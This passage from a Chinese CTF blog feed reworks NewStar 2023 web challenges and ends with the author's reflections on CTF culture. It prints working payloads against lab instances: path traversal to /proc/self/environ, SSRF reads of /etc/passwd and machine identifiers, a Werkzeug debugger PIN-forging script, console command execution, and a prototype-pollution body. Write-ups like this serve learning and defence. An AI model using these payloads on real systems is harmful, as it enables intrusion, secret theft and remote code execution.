(Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>103</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span><span class="attr">&quot;hash&quot;</span><span class="punctuation">:</span><span class="string">&quot;0afd24e3125c5866624e04b36fbcf393ec18bbcdc112178562b1ce505594f9b6&quot;</span><span class="punctuation">,</span><span class="attr">&quot;fn&quot;</span><span class="punctuation">:</span><span class="string">&quot;1.php.aaa&quot;</span><span class="punctuation">,</span><span class="attr">&quot;autoup&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><p><img src="/../images/achieve/2025/8/newstar2023/PixPin_2025-08-09_20-28-43.png" alt="1"></p><p>拿到Cookie之后，可以得到js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">Router</span> = <span class="built_in">require</span>(<span class="string">&quot;koa-router&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> router = <span class="keyword">new</span> <span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CONFIG</span> = <span class="built_in">require</span>(<span class="string">&quot;../../runtime.config.json&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">Res</span> = <span class="built_in">require</span>(<span class="string">&quot;../../components/utils/response&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> <span class="title class_">FileSignUtil</span> = <span class="built_in">require</span>(<span class="string">&quot;../../components/utils/file-signature&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; <span class="title class_">DriveUtil</span> &#125; = <span class="built_in">require</span>(<span class="string">&quot;../../components/utils/database.utilities&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; verifySession &#125; = <span class="built_in">require</span>(<span class="string">&quot;../../components/utils/session&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> logger = <span class="variable language_">global</span>.<span class="property">logger</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@deprecated</span></span></span><br><span class="line"><span class="comment"> * ! <span class="doctag">FIXME:</span> 发现漏洞，请进行修改</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&quot;/s/:hashfn&quot;</span>, <span class="title function_">async</span> (ctx, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">const</span> hash_fn = <span class="title class_">String</span>(ctx.<span class="property">params</span>.<span class="property">hashfn</span> || <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">const</span> hash = hash_fn.<span class="title function_">slice</span>(<span class="number">0</span>, <span class="number">64</span>)</span><br><span class="line">    <span class="keyword">const</span> from_uid = ctx.<span class="property">query</span>.<span class="property">from_uid</span></span><br><span class="line">    <span class="keyword">const</span> custom_fn = ctx.<span class="property">query</span>.<span class="property">fn</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 参数校验</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> hash_fn !== <span class="string">&quot;string&quot;</span> || <span class="keyword">typeof</span> from_uid !== <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="comment">// invalid params or query</span></span><br><span class="line">        ctx.<span class="title function_">set</span>(<span class="string">&quot;X-Error-Reason&quot;</span>, <span class="string">&quot;Invalid Params&quot;</span>);</span><br><span class="line">        ctx.<span class="property">status</span> = <span class="number">400</span>; <span class="comment">// Bad Request</span></span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">res</span>.<span class="title function_">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 是否为共享的文件</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable constant_">IS_FILE_EXIST</span> = <span class="keyword">await</span> <span class="title class_">DriveUtil</span>.<span class="title function_">isShareFileExist</span>(hash, from_uid)</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable constant_">IS_FILE_EXIST</span>) &#123;</span><br><span class="line">        ctx.<span class="title function_">set</span>(<span class="string">&quot;X-Error-Reason&quot;</span>, <span class="string">&quot;File Not Found&quot;</span>);</span><br><span class="line">        ctx.<span class="property">status</span> = <span class="number">404</span>; <span class="comment">// Not Found</span></span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">res</span>.<span class="title function_">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 系统中是否存储有该文件</span></span><br><span class="line">    <span class="keyword">let</span> <span class="variable constant_">IS_FILE_EXIST_IN_STORAGE</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable constant_">IS_FILE_EXIST_IN_STORAGE</span> = fs.<span class="title function_">existsSync</span>(path.<span class="title function_">resolve</span>(<span class="variable constant_">CONFIG</span>.<span class="property">storage_path</span>, hash_fn))</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        ctx.<span class="title function_">set</span>(<span class="string">&quot;X-Error-Reason&quot;</span>, <span class="string">&quot;Internal Server Error&quot;</span>);</span><br><span class="line">        ctx.<span class="property">status</span> = <span class="number">500</span>; <span class="comment">// Internal Server Error</span></span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">res</span>.<span class="title function_">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable constant_">IS_FILE_EXIST_IN_STORAGE</span>) &#123;</span><br><span class="line">        logger.<span class="title function_">error</span>(<span class="string">`File <span class="subst">$&#123;hash_fn.yellow&#125;</span> not found in storage, but exist in database!`</span>)</span><br><span class="line">        ctx.<span class="title function_">set</span>(<span class="string">&quot;X-Error-Reason&quot;</span>, <span class="string">&quot;Internal Server Error&quot;</span>);</span><br><span class="line">        ctx.<span class="property">status</span> = <span class="number">500</span>; <span class="comment">// Internal Server Error</span></span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">res</span>.<span class="title function_">end</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 文件名处理</span></span><br><span class="line">    <span class="keyword">let</span> filename = <span class="keyword">typeof</span> custom_fn === <span class="string">&quot;string&quot;</span> ? custom_fn : (<span class="keyword">await</span> <span class="title class_">DriveUtil</span>.<span class="title function_">getFilename</span>(from_uid, hash));</span><br><span class="line">    filename = filename.<span class="title function_">replace</span>(<span class="regexp">/[\\\/\:\*\&quot;\&#x27;\&lt;\&gt;\|\?\x00-\x1F\x7F]/gi</span>, <span class="string">&quot;_&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 发送</span></span><br><span class="line">    ctx.<span class="title function_">set</span>(<span class="string">&quot;Content-Disposition&quot;</span>, <span class="string">`attachment; filename*=UTF-8&#x27;&#x27;<span class="subst">$&#123;<span class="built_in">encodeURIComponent</span>(filename)&#125;</span>`</span>);</span><br><span class="line">    <span class="comment">// ctx.body = fs.createReadStream(path.resolve(CONFIG.storage_path, hash_fn))</span></span><br><span class="line">    <span class="keyword">await</span> ctx.<span class="title function_">sendFile</span>(path.<span class="title function_">resolve</span>(<span class="variable constant_">CONFIG</span>.<span class="property">storage_path</span>, hash_fn)).<span class="title function_">catch</span>(<span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">        logger.<span class="title function_">error</span>(<span class="string">`Error while sending file <span class="subst">$&#123;hash_fn.yellow&#125;</span>`</span>)</span><br><span class="line">        logger.<span class="title function_">error</span>(e)</span><br><span class="line">        ctx.<span class="property">status</span> = <span class="number">500</span>; <span class="comment">// Internal Server Error</span></span><br><span class="line">        <span class="keyword">return</span> ctx.<span class="property">res</span>.<span class="title function_">end</span>();</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>进行目录穿越即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/s/5da3818f2b481c261749c7e1e4042d4e545c1676752d6f209f2e7f4b0b5fd0cc%2F..%2F..%2F..%2F..%2Fproc%2Fself%2Fenviron?from_uid=100000</span><br></pre></td></tr></table></figure><h2 id="pppython"><a href="#pppython" class="headerlink" title="pppython?"></a>pppython?</h2><p><a href="https://www.cnblogs.com/m1xian/p/18528813">https://www.cnblogs.com/m1xian/p/18528813</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_REQUEST</span>[<span class="string">&#x27;hint&#x27;</span>] == [<span class="string">&quot;your?&quot;</span>, <span class="string">&quot;mine!&quot;</span>, <span class="string">&quot;hint!!&quot;</span>])&#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/plain&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls / -la&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_CONNECTTIMEOUT, <span class="number">60</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;lolita&#x27;</span>]);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);   </span><br><span class="line">    &#125;<span class="keyword">catch</span> (<span class="built_in">Error</span> <span class="variable">$x</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="title function_ invoke__">highlight_string</span>(<span class="variable">$x</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> <span class="title function_ invoke__">curl_setopt</span>(): The CURLOPT_HTTPHEADER option must have an <span class="keyword">array</span> value</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>直接数组过，然后文件读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?hint[0]=your?&amp;hint[1]=mine!&amp;hint[2]=hint!!</span><br><span class="line"></span><br><span class="line">?url=file:///app.py&amp;lolita[]=</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session, render_template, render_template_string</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="comment"># from NeepuF1Le import neepu_files</span></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="string">&#x27;******&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">welcome</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&quot;islogin&quot;</span>) == <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;flag&#123;***********************&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">1314</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>开启 debug模式，并且可以读取文件，打pin值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">?url=file:///etc/passwd&amp;lolita[]=</span><br><span class="line">得到root</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flask.app</span><br><span class="line">Flask</span><br><span class="line"></span><br><span class="line">?url=file:///sys/class/net/eth0/address&amp;lolita[]=</span><br><span class="line">f6:f5:77:8b:67:8d 1</span><br><span class="line"></span><br><span class="line">?url=file:///etc/machine-id&amp;lolita[]=</span><br><span class="line">1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?url=file:///proc/sys/kernel/random/boot_id&amp;lolita[]=</span><br><span class="line">a7cf87a4-f7b3-4edd-93e3-854e78d97842 1</span><br><span class="line"></span><br><span class="line">?url=file:///proc/self/cgroup&amp;lolita[]=</span><br><span class="line">-0f93015de51c77ebb8fd14065c835b0040120ffb05e60158b3d8bffc59e265e4.scope</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># NeepuF1Le 是什么python版本才出现的 -&gt; neupy python 3.10</span><br><span class="line">/usr/local/lib/python3.10/dist-packages/flask/app.py</span><br></pre></td></tr></table></figure><p>最后整理一下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root</span><br><span class="line">flask.app</span><br><span class="line">Flask</span><br><span class="line">/usr/local/lib/python3.10/dist-packages/flask/app.py</span><br><span class="line">271534133045133</span><br><span class="line">a7cf87a4-f7b3-4edd-93e3-854e78d97842-0f93015de51c77ebb8fd14065c835b0040120ffb05e60158b3d8bffc59e265e4.scope</span><br></pre></td></tr></table></figure><p>但是这是<code>python3.10</code>好像不能用于之前的脚本，之前都是3.8最高</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span>  </span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.10/site-packages/flask/app.py&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;271534133045133&#x27;</span>,  </span><br><span class="line">    <span class="string">&#x27;a7cf87a4-f7b3-4edd-93e3-854e78d97842-0f93015de51c77ebb8fd14065c835b0040120ffb05e60158b3d8bffc59e265e4.scope&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash_pin</span>(<span class="params">pin: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha1(<span class="string">f&quot;<span class="subst">&#123;pin&#125;</span> added salt&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;replace&quot;</span>)).hexdigest()[:<span class="number">12</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(cookie_name + <span class="string">&quot;=&quot;</span> + <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(time.time())&#125;</span>|<span class="subst">&#123;hash_pin(rv)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到<code>107-667-381</code>和<code>__wzd03fbc8a0ce3cfdab3d2e=1754745570|65ee6ca6bbab</code></p><p>访问console来获得<code>secret</code>和<code>frm</code>，没有报错<code>frm</code>默认为0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?url=http://localhost:1314/console&amp;lolita[]=</span><br><span class="line">JbjRr8rMsX31cclteJRo</span><br></pre></td></tr></table></figure><p>再来ssrf这里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?lolita[]=Cookie:__wzd03fbc8a0ce3cfdab3d2e=1754745570|65ee6ca6bbab&amp;url=http://127.0.0.1:1314/console?__debugger__=yes&amp;pin=107-667-381&amp;cmd=__import__(&quot;os&quot;).popen(&quot;cat%2B/flag&quot;).read()&amp;frm=0&amp;s=JbjRr8rMsX31cclteJRo</span><br></pre></td></tr></table></figure><h2 id="OtenkiBoy"><a href="#OtenkiBoy" class="headerlink" title="OtenkiBoy"></a>OtenkiBoy</h2><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/submit</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>88e6e9a7-4df0-4f84-9c6c-623688a9f061.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>176</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://88e6e9a7-4df0-4f84-9c6c-623688a9f061.node5.buuoj.cn:81</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://88e6e9a7-4df0-4f84-9c6c-623688a9f061.node5.buuoj.cn:81/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,zh-TW;q=0.7</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"><span class="language-json"><span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;contact&quot;</span><span class="punctuation">:</span><span class="string">&quot;a&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;reason&quot;</span><span class="punctuation">:</span><span class="string">&quot;a&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">  <span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json">    <span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span></span><br><span class="line"><span class="language-json">      <span class="attr">&quot;format&quot;</span><span class="punctuation">:</span> <span class="string">&quot;yy19-MM-ddTHH:mm:ss.fffZ&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">      <span class="attr">&quot;baseDate&quot;</span><span class="punctuation">:</span><span class="string">&quot;aaa&quot;</span><span class="punctuation">,</span></span></span><br><span class="line"><span class="language-json">      <span class="attr">&quot;fff&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bbb&quot;</span></span></span><br><span class="line"><span class="language-json">    <span class="punctuation">&#125;</span></span></span><br><span class="line"><span class="language-json">  <span class="punctuation">&#125;</span></span></span><br><span class="line"><span class="language-json"><span class="punctuation">&#125;</span></span></span><br></pre></td></tr></table></figure><h2 id="聊聊"><a href="#聊聊" class="headerlink" title="聊聊"></a>聊聊</h2><p>你居然看到了这里？突然想起来去年我以为太菜而晚上失眠（十二点多才睡着，虽然现在已经是家常），太菜主要是两个点，第一个是nepCTF，我已经学了快半年了当时，还是做不出来什么题，甚至说自己看代码都难得很，还有一个就是出题，newstar这类的新生赛，我是一个邀请都没有。没人知道我，更没人会记得我。</p><p>于是我就开始骚扰我的师父，他工作强度还是挺高的，我一个人发了二十多条信息，叽里呱啦的，但是他一条也没回（心想最后的依靠都没了），过了一分钟，“明年你如果想出题的话，我可以帮你搞定这件事”。这次骚扰的原因，其实还是自尊心作祟，因为当时的出题人web里面真不是特别厉害，我觉得我应该是比他们要略微强一丢丢的，但是我却没有这样的机会www。</p><p>忽而都已经过去一年了，之前差点爆零的nepCTF也是能做最后一题了，而且心态变化，现在你可能让我去出这种新生赛的题我都不大愿意了（base可以），年初和去年末很多新生赛，mmp，都是打着新生赛的旗号，展示自己的，有些东西你能遇到我吃，就拿某GAME和昨年五个学校联合（黑龙江理工在内，名字忘了），主要吐槽两个题，一个比赛一个（不偏爱哈），一个是某NDAY的复现，利用条件极其苛刻，另一个是http，里面的http头我一个都不知道，真就一点都没见过。</p><p>这两天花时间做了做23年的newstar，发现我竟然还是能从新生赛里面学到东西，令我形象深刻更是。但是年初和去年末这段时间的新生赛，我基本就没学到什么东西了，更何况是去年的我，甚至你问我做过的题，我可能一点形象都没有。</p><p>说到最后其实就是想让看到这里的师傅，出题的师傅尽量不要套，更不要脑洞，就分享自己最近研究的姿势就可以了，特别是别随便甩个冷门NDAY（这不傻*吗）。最近会有一个LILCTF，里面的师傅水平都和我差不多、更好，既然是打了“初心”的旗号的，我觉得可以冲（我要和suer参加国际赛就不来了），预祝LILCTF顺利举办。</p><p>还有一个CTF就是SU Junior，我看了文档的，简直就是分站赛级别的精华题目，可别错过嗷，暂时还有定档，肯定是在九、十月！</p>]]></content>
    
    
    <summary type="html">依旧放松，不对劲，好像并不放松</summary>
    
    
    
    <category term="复现" scheme="https://baozongwi.xyz/categories/%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="php" scheme="https://baozongwi.xyz/tags/php/"/>
    
    <category term="ssti" scheme="https://baozongwi.xyz/tags/ssti/"/>
    
    <category term="mysql" scheme="https://baozongwi.xyz/tags/mysql/"/>
    
    <category term="phar" scheme="https://baozongwi.xyz/tags/phar/"/>
    
    <category term="nodejs" scheme="https://baozongwi.xyz/tags/nodejs/"/>
    
  </entry>
  
  <entry>
    <title>Dest0g3 520迎新赛</title>
    <link href="https://baozongwi.xyz/posts/32931.html"/>
    <id>https://baozongwi.xyz/posts/32931.html</id>
    <published>2025-08-08T08:27:50.000Z</published>
    <updated>2025-08-08T11:09:15.849Z</updated>
    
